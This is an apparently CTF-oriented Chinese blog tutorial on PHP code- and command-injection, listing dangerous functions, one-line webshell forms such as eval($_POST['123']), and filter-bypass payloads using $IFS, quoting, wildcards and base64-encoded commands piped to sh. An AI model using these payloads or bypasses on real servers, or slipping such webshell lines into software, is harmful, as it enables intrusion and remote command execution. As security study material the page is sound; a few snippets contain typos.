@@ -1,0 +1,579 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="welcome to my blog" href="https://hq185187.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="welcome to my blog" href="https://hq185187.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="welcome to my blog" href="https://hq185187.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="java,git,springcloud" />
+
+
+<link rel="canonical" href="https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+
+
+  <title>
+命令执行漏洞及绕过方法 |
+不良人天藏星 = welcome to my blog = 不良人总舵</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">命令执行漏洞及绕过方法
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-04-28 19:14:02">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-04-28T19:14:02+08:00">2023-04-28</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">不良人天藏星</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicm07ih54j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giph4lm9i7j20zk0m84qp.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="hq185187">
+    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="welcome to my blog">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="代码执行"><a class="markdownIt-Anchor" href="#代码执行">#</a> 代码执行</h2>
+<p>代码执行：未严格过滤用户输入的参数，导致用户可以通过传参在 web 服务器上<mark>执行恶意代码.</mark><br>
+ 可变函数：一个变量名后面如果有圆括号，php 将寻找同名函数调用</p>
+<p>eval: 将一个字符串作为 php 代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_POST[&#x27;123&#x27;])</span><br></pre></td></tr></table></figure>
+<p>eval 是一个语言构造器，不是函数，不能当可变函数</p>
+<p>assert (): 执行一个有返回值的 php 表达式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert($_POST[&#x27;123&#x27;])</span><br></pre></td></tr></table></figure>
+<p>php7.2 以后与 eval 一样是语言构造器不是函数</p>
+<p>call_user_func (): 把第一个参数作为回调函数使用，其他参数是回调函数参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;,&#x27;eval($_POST[&#x27;123&#x27;])&#x27;)</span><br></pre></td></tr></table></figure>
+<p>call_user_func_array (): 把第一个参数作为回调参数使用，第二个数组类型作为回调函数的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(&#x27;assert&#x27;,[&#x27;eval($__POST[&#x27;123&#x27;])&#x27;])</span><br></pre></td></tr></table></figure>
+<p>array_map (): 为数组的每一个元素应用回调函数，第一个参数是回调函数，第二个参数是数组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map(&#x27;assert&#x27;,[&#x27;eval($POST[&#x27;123&#x27;])&#x27;])</span><br></pre></td></tr></table></figure>
+<p>array_filter (): 使用回调函数过滤数组中的元素。第一个参数是数组，第二个参数是回调函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter([&#x27;eval($__POST[&#x27;123&#x27;])&#x27;],&#x27;assert&#x27;)</span><br></pre></td></tr></table></figure>
+<p>array_reduce (): 发送数组中的值到回调函数调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_reduce([1,2],&#x27;assert&#x27;,&#x27;phpinfo()&#x27;)</span><br></pre></td></tr></table></figure>
+<p>phpinfo () 是发送的第一个参数</p>
+<p>preg_replace (): 将匹配到的字符串替换为指定的字符串并返回完整字符串</p>
+<h2 id="命令执行"><a class="markdownIt-Anchor" href="#命令执行">#</a> 命令执行</h2>
+<p>未严格过滤用户输入的参数，导致用户可以通过传参在 web 服务器<mark>终端执行系统命令</mark></p>
+<p>system()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(whoami)</span><br></pre></td></tr></table></figure>
+<p>passthru()<br>
+ 同 system ()</p>
+<p>exec (): 默认没有回显，需要手动加上 echo. 而且回显只会输出一行结果，因此经常用第二个数组参数接收多行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$arr=[];</span><br><span class="line">echo exec(&#x27;ipconfig&#x27;,$arr);</span><br><span class="line">var_dump($arr);</span><br></pre></td></tr></table></figure>
+<p>shell_exec (): 默认没有回显，需要手动加上 echo, 可以输出多行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$arr=[];</span><br><span class="line">echo shell_exec(&#x27;ipconfig&#x27;);</span><br></pre></td></tr></table></figure>
+<p>反引号：反引号内的代码被当作系统命令执行，默认没有回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `ipconfig`;</span><br></pre></td></tr></table></figure>
+<p>popen (): 打开一个指向进程的通道，该进程由派生给定的 command 命令执行而生产</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fp=popen(&#x27;whoami&#x27;,&#x27;r&#x27;);</span><br><span class="line">while(!feof($fp))&#123;</span><br><span class="line">$content=fgetss($fp);</span><br><span class="line">&#125;</span><br><span class="line">echo $content;</span><br></pre></td></tr></table></figure>
+<h2 id="基础"><a class="markdownIt-Anchor" href="#基础">#</a> 基础</h2>
+<h3 id="1转义字符"><a class="markdownIt-Anchor" href="#1转义字符">#</a> 1. 转义字符</h3>
+<p>Windows 下是 ^  Linux 下是 \</p>
+<h3 id="2多条命令执行"><a class="markdownIt-Anchor" href="#2多条命令执行">#</a> 2. 多条命令执行</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows:&amp;&amp;,||,%0a</span><br><span class="line">linux:&amp;&amp;,||,;,$(),``,%0a,%0d</span><br></pre></td></tr></table></figure>
+<p>%0a 和 %0d 是由于换行才可以多条命令执行<br>
+<mark> Linux 下双引号包裹的字符串 $() 会被当做命令执行，单引号单纯就是字符串</mark></p>
+<h3 id="3注释符号"><a class="markdownIt-Anchor" href="#3注释符号">#</a> 3. 注释符号</h3>
+<p>Windows:&quot;::&quot;<br>
+Linux:&quot;#&quot;</p>
+<h2 id="常见连接符管道符"><a class="markdownIt-Anchor" href="#常见连接符管道符">#</a> 常见连接符 (管道符)</h2>
+<ol>
+<li>|：A|B 不管 A 命令成功与否，都会去执行 b 命令。</li>
+<li>&amp;：A&amp;B 各自执行</li>
+<li>||：A||B 先执行 A，如果为假，才执行 B</li>
+<li>&amp;&amp; ：A&amp;&amp;B 先执行 A，如果为真，才执行 B</li>
+<li>；： A;B 先执行 A 后执行 B</li>
+</ol>
+<p>可以执行的命令:</p>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 查看系统信息</span><br><span class="line">ipconfig  查看本地网络</span><br><span class="line">net  user  查看系统用户</span><br><span class="line">dir  查看当前目录</span><br><span class="line">whoami 用户名</span><br><span class="line">ver操作系统 (username -a)</span><br><span class="line">netstat 网络连接 (Linux是netstat -an)</span><br><span class="line">tasklist 运行进程(Linux是ps -ef)</span><br></pre></td></tr></table></figure>
+<h2 id="绕过方法"><a class="markdownIt-Anchor" href="#绕过方法">#</a> 绕过方法</h2>
+<h3 id="1空格绕过"><a class="markdownIt-Anchor" href="#1空格绕过">#</a> 1. 空格绕过</h3>
+<p>1. <code>$&#123;IFS&#125;,&#123;IFS&#125;,$IFS,&lt;,&lt;&gt;,</code> <br>
+2.$IFS$9 $9 指传过来的第 9 个参数<br>
+ 3.%09 ,%0b,%0c 等，可以用 burp 在 %00-% ff 之间爆破<br>
+ 4. 字符串截取<br>
+ 1.Windows 下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%ProgramFiles:~10,1%</span><br><span class="line">~是截取符,表示获取环境变量%ProgramFiles%的值,一般是C:\Program Files,这个命令在把它第十位截取一位,就是空格</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo%ProgramFiles:~10,1%111</span><br><span class="line">111</span><br></pre></td></tr></table></figure>
+<p>2.Linux 下:<br>
+(1)$IFS$9<br>
+ (2){cmd,args}  bash 有效，zsh 和 dash 无效<br>
+ (3) 读取文件时:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br></pre></td></tr></table></figure>
+<p>注意：可以让 IFS=, 来进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo;IFS=,;cat flag</span><br><span class="line">echo;IFS=,;whoami</span><br></pre></td></tr></table></figure>
+<p>4.&lt;或者 &lt;&gt; 重定向</p>
+<h2 id="2黑名单绕过"><a class="markdownIt-Anchor" href="#2黑名单绕过">#</a> 2. 黑名单绕过</h2>
+<p>1. 变量拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a$b$c$d</span><br></pre></td></tr></table></figure>
+<p>2. 单引号，双引号绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca&#x27;&#x27;t flag</span><br><span class="line">cat&quot;&quot; flag</span><br></pre></td></tr></table></figure>
+<h2 id="3编码绕过"><a class="markdownIt-Anchor" href="#3编码绕过">#</a> 3. 编码绕过</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.$(printf &quot;\154\163&quot;) ==&gt;ls</span><br><span class="line">2.$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag</span><br><span class="line">3.</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</span><br></pre></td></tr></table></figure>
+<h2 id="4读文件绕过当cat被过滤"><a class="markdownIt-Anchor" href="#4读文件绕过当cat被过滤">#</a> 4. 读文件绕过 (当 cat 被过滤)</h2>
+<p>(1) more: 一页一页的显示档案内容<br>
+ (2) less: 与 more 类似，但是比 more 更好的是，他可以 [pg dn][pg up] 翻页<br>
+ (3) head: 查看头几行<br>
+ (4) tac: 从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>
+ (5) tail: 查看尾几行<br>
+ (6) nl：显示的时候，顺便输出行号<br>
+ (7) od: 以二进制的方式读取档案内容<br>
+ (8) vi: 一种编辑器，这个也可以查看<br>
+ (9) vim: 一种编辑器，这个也可以查看<br>
+ (10) sort: 可以查看<br>
+ (11) uniq: 可以查看<br>
+ (12) file -f: 报错出具体内容</p>
+<h2 id="5反斜线"><a class="markdownIt-Anchor" href="#5反斜线">#</a> 5. 反斜线</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
+<h2 id="612等和"><a class="markdownIt-Anchor" href="#612等和">#</a> 6.$1,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mtext>等和</mtext></mrow><annotation encoding="application/x-tex">2等和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">和</span></span></span></span> @</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c$1at fl$@ag</span><br></pre></td></tr></table></figure>
+<h2 id="7通配符绕过"><a class="markdownIt-Anchor" href="#7通配符绕过">#</a> 7. 通配符绕过</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;?&quot;代表一个字符,&quot;*&quot;代表一串字符</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">2.?at flag</span><br><span class="line">3.?at ????</span><br><span class="line">4.?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[]表示一个范围(正则),eg[abcd]匹配a,b,c,d</span><br><span class="line">&#123;&#125;产生一个序列</span><br></pre></td></tr></table></figure>
+<h2 id="8内敛执行绕过"><a class="markdownIt-Anchor" href="#8内敛执行绕过">#</a> 8. 内敛执行绕过</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zxcv0221@kali:~/桌面$ echo &quot;m0re`cat flag`&quot;</span><br><span class="line">m0reyou are good!</span><br><span class="line">zxcv0221@kali:~/桌面$ echo &quot;m0re $(cat flag)&quot;</span><br><span class="line">m0re you are good!</span><br><span class="line">zxcv0221@kali:~/桌面$ echo &quot;m0re $(pwd)&quot;</span><br><span class="line">m0re /home/zxcv0221/桌面</span><br></pre></td></tr></table></figure>
+<h2 id="9编码绕过"><a class="markdownIt-Anchor" href="#9编码绕过">#</a> 9. 编码绕过</h2>
+<p><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code> <br>
+ 有的题目过滤了 bash, 可以用 sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash无法使用</span><br><span class="line">可以用?ip=127.0.0.1;echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|sh</span><br></pre></td></tr></table></figure>
+<p>ZmxhZw==|base64 -d</p>
+<h2 id="10绕过长度限制和的使用"><a class="markdownIt-Anchor" href="#10绕过长度限制和的使用">#</a> 10. 绕过长度限制 &gt; 和 &gt;&gt; 的使用</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用`&gt;`命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&gt;&gt;`符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</span><br></pre></td></tr></table></figure>
+<h2 id="11命令换行"><a class="markdownIt-Anchor" href="#11命令换行">#</a> 11. 命令换行</h2>
+<p>ca<br>
+t<br>
+fl<br>
+ag</p>
+<h2 id="12借用已有字符串"><a class="markdownIt-Anchor" href="#12借用已有字符串">#</a> 12. 借用已有字符串</h2>
+<p>substr 截取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expr substr ceshi01.php 3 5</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo `expr substr $(awk NR==1 ceshi01.php) 1 1`</span><br></pre></td></tr></table></figure>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-04-28 19:14:31" itemprop="dateModified" datetime="2023-04-28T19:14:31+08:00">2023-04-28</time>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://hq185187.github.io/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">https://hq185187.github.io/2023/04/28/命令执行漏洞/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/04/27/unserialize-labs/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevo9j1jj20zk0m8e81.jpg" title="Unserialize-labs">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>Unserialize-labs</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text"> 代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text"> 命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">3.</span> <span class="toc-text"> 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6"><span class="toc-number">3.1.</span> <span class="toc-text"> 1. 转义字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%A4%9A%E6%9D%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.</span> <span class="toc-text"> 2. 多条命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7"><span class="toc-number">3.3.</span> <span class="toc-text"> 3. 注释符号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%9E%E6%8E%A5%E7%AC%A6%E7%AE%A1%E9%81%93%E7%AC%A6"><span class="toc-number">4.</span> <span class="toc-text"> 常见连接符 (管道符)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text"> 绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text"> 1. 空格绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text"> 2. 黑名单绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text"> 3. 编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E8%AF%BB%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87%E5%BD%93cat%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="toc-number">8.</span> <span class="toc-text"> 4. 读文件绕过 (当 cat 被过滤)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E5%8F%8D%E6%96%9C%E7%BA%BF"><span class="toc-number">9.</span> <span class="toc-text"> 5. 反斜线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#612%E7%AD%89%E5%92%8C"><span class="toc-number">10.</span> <span class="toc-text"> 6.$1,2等和2等和2等和 @</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">11.</span> <span class="toc-text"> 7. 通配符绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">12.</span> <span class="toc-text"> 8. 内敛执行绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text"> 9. 编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%92%8C%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">14.</span> <span class="toc-text"> 10. 绕过长度限制 &gt; 和 &gt;&gt; 的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E5%91%BD%E4%BB%A4%E6%8D%A2%E8%A1%8C"><span class="toc-number">15.</span> <span class="toc-text"> 11. 命令换行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E5%80%9F%E7%94%A8%E5%B7%B2%E6%9C%89%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">16.</span> <span class="toc-text"> 12. 借用已有字符串</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="hq185187"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">hq185187</p>
+  <div class="description" itemprop="description">不定时更新web安全相关知识</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">10</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hxMTg1MTg3" title="https:&#x2F;&#x2F;github.com&#x2F;hq185187"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
